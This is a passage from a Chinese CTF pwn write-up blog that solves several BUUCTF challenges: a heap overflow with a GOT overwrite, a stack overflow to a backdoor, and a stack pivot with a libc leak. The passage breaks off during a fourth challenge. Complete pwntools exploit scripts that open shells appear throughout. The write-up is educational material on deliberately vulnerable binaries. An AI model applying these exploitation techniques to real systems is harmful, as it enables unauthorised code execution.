<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span>                 <span class="comment">//v2=malloc(0x80)   v2 就是 结构体指针</span></span><br><span class="line">	<span class="keyword">char</span> *desc;              <span class="comment">//*v2=decs_mem_addr  而 decs_mem_addr=malloc(desc_size) </span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">7</span>c];           <span class="comment">//sub_80486BB((char *)ptr[(unsigned __int8)i_804B069] + 4, 0x7C);</span></span><br><span class="line">	&#125;user;</span><br></pre></td></tr></table></figure>

<p>我们可以请容易看出  ptr （0x0804B080）相当于 是 保存结构体指针的数组。<br>delete_8048905<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Z4nx.png" alt="J9Z4nx.png"><br><br>show_804898F<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Z5B6.png" alt="J9Z5B6.png"><br><br>update_8048724<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Zfj1.png" alt="J9Zfj1.png"><br><br>我们重点 分析下 这个 update_8048724 函数 就好了。</p>
<p>看第 13 行，程序  是 通过     (new_desc_size + ptr[i]-&gt;desc  &lt; (&amp;ptr[i] - 4 ) 检测才可以  继续 update 操作的。<br>正常来看的话，因为 malloc(struct user) 堆块 晚于 malloc(struct user-&gt;desc)堆块，且堆块相邻，所以，这个检测 的 本意是在update 每个user结构体中 desc 时，控制了new_desc_size 在于 这两个 堆块之间的距离再<br>-4 的 大小，这样的话，就不存在 堆溢出问题。</p>
<p>但这里我们可根据 堆分配的 理解，我们 可通过 一些操作去使得   malloc(struct user) 堆块 返回的地址与 malloc(struct user-&gt;desc)堆块返回的地址 之间的距离 变的很大。这样 我们就可以拥有 比较大的最多可输入 字节 数据，从而 使得程序 有堆溢出漏洞。 </p>
<p>而要如何操作呢，我们 可首先 add 两个 结构体 user0，user1，用于  刚刚说的” 一些操作”,</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">"aaa"</span>,<span class="number">0x80</span>,<span class="string">"aaa"</span>)#<span class="number">0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">"bbb"</span>,<span class="number">0x80</span>,<span class="string">"bbb"</span>)#<span class="number">1</span></span><br><span class="line">#gdb.<span class="section">attach</span>(p)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"ccc"</span>,<span class="number">0x20</span>,<span class="string">"/bin/sh\x00"</span>)#<span class="number">2</span>              # user2 用于 后面的 的操作，待会说</span><br><span class="line">#gdb.<span class="section">attach</span>(p)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gdb.<span class="section">attach</span>(p)</span><br></pre></td></tr></table></figure>

<p>我们 将user0 给 free 掉，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZIHK.png" alt="J9ZIHK.png"><br><br>此时 的bins 上  是 有个 272  即 hex(273)  即0x111 即 0x88+0x88+1的unsidned chunk，<br>而如果我们申请 把这个0x111的size chunk 给申请出来 且 全当做 新的 user0-&gt;desc的堆块，那么这个堆块返回的地址 就会是 0x9f92000+8 ，而接着 在add 函数中又会申请 0x80的chunk 当作 新的user 的chunk，这个 就会是从 top chunk 申请出 的 chunk 了，两者地址间的 距离相隔 就很大了，没有具体算了，肯定 大于  0x198,而  新的 user0-&gt;desc的堆块，那么这个堆块的返回的地址( 0x9f92000+8) 再加0x198的位置就是 user1结构体中的 desc指针了，因为此时已经存在栈溢出了 ，我们 把这个 指针给溢出覆盖成  free_got地址，然后可以通过show 函数来输出 free_got函数，进而leak出 libc，进而得到system 函数地址。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x100,<span class="string">"ddd"</span>,<span class="number">0</span>x19c,<span class="string">"d"</span>*<span class="number">0</span>x198+p32(elf.got[<span class="string">'free'</span>])</span></span>)		#<span class="number">0</span></span><br><span class="line"><span class="selector-id">#gdb</span>.attach(p)</span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>接着 我们 再通过 update 函数 再将 user1 中的desc(此时对应的指针是 free_got了)，中的内容给改成 system，所以 只要我们执行 free(“/bin/sh\x00”)，就意味着 执行 system(“/bin/sh\x00”)了，从而pwn掉程序！<br>而再最开始  我们在  add user2 结构体时就已经提前 写入了 “/bin/sh\x00”了，所以 最后我们再 delete(2-1)即  delete(1)就可以拿到 shell了</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">update</span><span class="params">(<span class="number">1</span>,<span class="number">0</span>x4, p32(system_addr)</span></span>)</span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>完整 exp如下：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"><span class="built_in">from</span> LibcSearcher import *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">'./babyfengshui_33c3_2016'</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",29957)</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfengshui_33c3_2016'</span>)</span><br><span class="line"><span class="comment">#libc=ELF("/lib/i386-linux-gnu/libc.so.6")#local</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,name,<span class="built_in">length</span>,<span class="keyword">text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"0"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"size of description: "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"name: "</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">"text length: "</span>,str(<span class="built_in">length</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"text: "</span>,<span class="keyword">text</span>)</span><br><span class="line"></span><br><span class="line">def update(index, <span class="built_in">length</span>, desc):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">"text length: "</span>,str(<span class="built_in">length</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"text: "</span>,desc)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(index):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x80</span>,<span class="string">"aaa"</span>,<span class="number">0x80</span>,<span class="string">"aaa"</span>)<span class="comment">#0</span></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x80</span>,<span class="string">"bbb"</span>,<span class="number">0x80</span>,<span class="string">"bbb"</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x20</span>,<span class="string">"ccc"</span>,<span class="number">0x20</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x100</span>,<span class="string">"ddd"</span>,<span class="number">0x19c</span>,<span class="string">"d"</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">'free'</span>]))		<span class="comment">#0</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"description: "</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"free"</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">"free"</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])</span></span><br><span class="line">print <span class="string">"system : "</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x4</span>, p32(system_addr))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>环境：ubuntu 16.04<br>经过前面两篇文章的讲解，这个实在属于最简单的 栈溢出题了。<br>简单说下 了。<br>ida：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**********************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*     Welcome to the BJDCTF!     *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"* And Welcome to the bin world!  *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*  Let's try to pwn the world!   *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"* Please told me u answer loudly!*"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Are u ready?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Please input the length of your name:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;nbytes);                <span class="comment">// 输入 接下来 要输入的 长 度</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]What's u name?"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);          <span class="comment">// 输入 最长 为 nbytes 的内容</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">***********************************************</span><br><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);                            <span class="comment">// 0x4006E6</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>栈溢出 ，然后还有 后门函数，直接写脚本了。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./bjdctf_2020_babystack"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27670</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input the length of your name:<span class="subst">\n</span>"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x30</span>))</span><br><span class="line">#gdb.<span class="section">attach</span>(p)</span><br><span class="line">p.recvuntil(<span class="string">"What's u name?<span class="subst">\n</span>"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x4006E6</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p><img src="https://s1.ax1x.com/2020/04/15/J9ZTAO.png" alt="J9ZTAO.png"><br><br>这道题 考察栈迁移的，刚好再次把它给熟悉下。我们 还像 往常一样首先 检查下 程序开启保护：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">spwn</span> </span><br><span class="line"><span class="attr">spwn:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> </span><br><span class="line"><span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> <span class="string">BuildID[sha1]=0ffa519ef269240388d07b316b1ef863216e24cb,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">spwn</span></span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span>         <span class="string">//开启了</span> <span class="string">NX保护</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure>

<p>32位 elf 程序，开启了 NX保护，于是首先暂时就不必去想 用shellcode了。<br>我们看下ida：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vul_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-18h]              //buf的偏移： ebp-0x18</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, m1, v0);                             <span class="comment">// Hello good Ctfer!</span></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);                          <span class="comment">// bss 段 输入 最长 0x200字节的数据</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, m2, v1);                             <span class="comment">// What do you want to say?</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);                  <span class="comment">// 存在栈溢出漏洞，但最多只可 覆盖到ret_addr</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序 还是很容易看得懂的，看最后的 read(0, &amp;buf, 0x20u)函数，这里虽然存在栈溢出，但仅可溢出到 ret_Addr,但这程序中是没有 后门函数的，所以我们 首先要做的 其实是 泄露出libc，并且要控制 要 返回到 main地址，因为我们目前才可以得到libc，我们还要接下来的拿shell 操作。</p>
<p>而栈溢出 的长度 不够我们在最后read函数这里去构造泄露libc的rop链， 而栈迁移 是刚好用来解决这个 问题的，我们再开始之前 先来了解下 栈迁移的基本知识，</p>
<p>我们来 看下汇编中 这几个指令的本质：<br>call:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">eip</span>+<span class="number">4</span><span class="comment">;        //将call 所在地址的下一行的(栈)地址 push进栈</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ebp</span><span class="comment">;          //将ebp栈地址 push 进栈</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span><span class="comment">;       //将 esp栈地址 赋值给 ebp栈地址</span></span><br></pre></td></tr></table></figure>

<p>leave:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="built_in">ebp</span> <span class="comment">;      //将 ebp栈地址 赋值给 esp栈地址</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebp</span><span class="comment">;           //将esp栈地址中的数据 pop给 ebp栈地址中</span></span><br><span class="line"></span><br><span class="line">再执行完 <span class="keyword">leave</span> 后   </span><br><span class="line"><span class="built_in">esp</span>的栈地址变成了<span class="built_in">ebp</span>再+<span class="number">4</span>的栈地址，<span class="built_in">ebp</span>的栈地址变成了<span class="built_in">ebp</span>栈地址中的数据</span><br></pre></td></tr></table></figure>

<p>ret：</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> eip;           <span class="comment">//将esp栈地址中的数据 pop 给 eip</span></span><br></pre></td></tr></table></figure>

<p>我们首先构造好 泄露libc且会再次返回到main地址的 rop攻击链：放在 bss 段上   //s的位置</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rop=p32(<span class="name">write_plt</span>)+p32(<span class="name">main</span>)+p32(<span class="number">1</span>)+p32(<span class="name">write_got</span>)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>“pop eip 相当于将栈顶数据给了eip，由于ret返回的是esp栈地址中的数据， 而leave将ebp栈地址的值赋给了esp栈地址，所以可以通过覆盖ebp栈地址中的数据来控制ret的返回地址，而两次leave就可以控制esp为我们想要的地址了，不过第二次的pop ebp是多余的，会使esp-4，所以将ebp覆盖到我们构造的函数地址-4即可”</p>
<p>我们这样 覆盖：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pd2='a'*0x18</span><br><span class="line">pd2+=p32(bss_addr-4)        <span class="comment">#ebp</span></span><br><span class="line">pd2+=p32(leave_ret)          <span class="comment">#ret_addr</span></span><br></pre></td></tr></table></figure>

<p>我觉得 这个实在光看文字会 太绕，我gdb 动态给展示下：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Zq9H.png" alt="J9Zq9H.png"><br><br>此时的ebp，esp</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP  <span class="number">0xffa4ea98</span> —▸ <span class="number">0x804a2fc</span> (fake2+<span class="number">508</span>) ◂— <span class="number">0x0</span></span><br><span class="line"> ESP  <span class="number">0xffa4ea80</span> ◂— <span class="number">0x61616161</span> ('aaaa')</span><br></pre></td></tr></table></figure>

<p>根据上面 的leave 指令的实质，执行过 leave 后，esp的栈地址变成了ebp再+4的栈地址，ebp的栈地址变成了ebp栈地址中的数据<br>即 执行完leave指令后 期望 应该是</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP： <span class="number">0x804a2fc</span> (fake2+<span class="number">508</span>) ◂— <span class="number">0x0</span></span><br><span class="line">ESP：<span class="number">0xffa4ea98</span>+<span class="number">4</span> 即<span class="number">0xffa4ea9c</span></span><br></pre></td></tr></table></figure>

<p>我们 ni 走下：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZOgA.png" alt="J9ZOgA.png"><br><br>和我们预想的一样，而接着 我们在ret_addr 再填一个 leave，执行ret后 会再执行一次 leave，会使得 ebp和esp再经历一次上面一样的变化，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZXjI.png" alt="J9ZXjI.png"><br><br>执行 return 后可以看到 确实又执行到 leave<br>此时:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">EBP</span>  <span class="number">0x804a2fc</span> (fake2+<span class="number">508</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="built_in">ESP</span>  <span class="number">0xffa4eaa0</span> —▸ <span class="number">0xf7fd29b0</span> (_dl_fini) ◂— <span class="keyword">push</span>   <span class="built_in">ebp</span></span><br></pre></td></tr></table></figure>

<p>同样 我们猜测  下再次执行完后 leave 后esp 和ebp的状态：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP  <span class="number">0x0</span></span><br><span class="line">ESP  <span class="number">0x804a2fc</span>+<span class="number">4</span> 即 <span class="number">0x0804A300</span>(s的位置)</span><br></pre></td></tr></table></figure>

<p>符合我们的期望！<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZxDP.png" alt="J9ZxDP.png"><br><br>接着 就 执行到 我们的 构造的ROP攻击链了。<br>根据以上，我们写出下面exp：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p=remote('node3.buuoj.cn',26843)</span><br><span class="line"><span class="comment">#p=process('./spwn')</span></span><br><span class="line">elf=ELF('./spwn')</span><br><span class="line">write_plt=elf.plt['write']</span><br><span class="line">write_got=elf.got['write']</span><br><span class="line">main_addr=elf.symbols['main']</span><br><span class="line">bss_addr=0x0804A300                     <span class="comment">#s</span></span><br><span class="line">leave_ret=0x08048511</span><br><span class="line"></span><br><span class="line">pd=p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)    <span class="comment">#返回到main 使程序重新执行一次，为下步拿shell做准备</span></span><br><span class="line">p.recvuntil(<span class="string">"What is your name?"</span>)</span><br><span class="line">p.send(pd)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pd2='a'*0x18</span><br><span class="line">pd2+=p32(bss_addr-4)        <span class="comment">#ebp</span></span><br><span class="line">pd2+=p32(leave_ret)          <span class="comment">#ret_addr</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What do you want to say?"</span>)</span><br><span class="line">p.send(pd2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">print <span class="string">"write_addr "</span>+hex(write_addr)</span><br><span class="line">libc=LibcSearcher('write',write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump('write')</span><br><span class="line">system_addr=libc_base+libc.dump('system')</span><br><span class="line">str_bin_sh=libc_base+libc.dump('str_bin_sh')</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What is your name?"</span>)</span><br><span class="line">pd=p32(system_addr)+p32(main_addr)+p32(str_bin_sh)</span><br><span class="line">p.send(pd)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What do you want to say?"</span>)</span><br><span class="line">p.send(pd2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>稍微 总结下 ，栈迁移的题，这题的话是一种类型（程序中是有leave；ret；），我们可以在 ret_addr处 填入 leave，ebp处 填入 我们的rop链所在地址，再减4 的地址。即可达到切栈的效果。 </p>
<h2 id="BJDCTF-2nd-ydsneedgirlfriend2"><a href="#BJDCTF-2nd-ydsneedgirlfriend2" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h2><p>这一题 其实也属于  堆上的基础题了。UAF漏洞。<br>最开始分析程序之前 我们检查下 程序开启的相关保护：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">ydsneedgirlfriend2</span></span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span 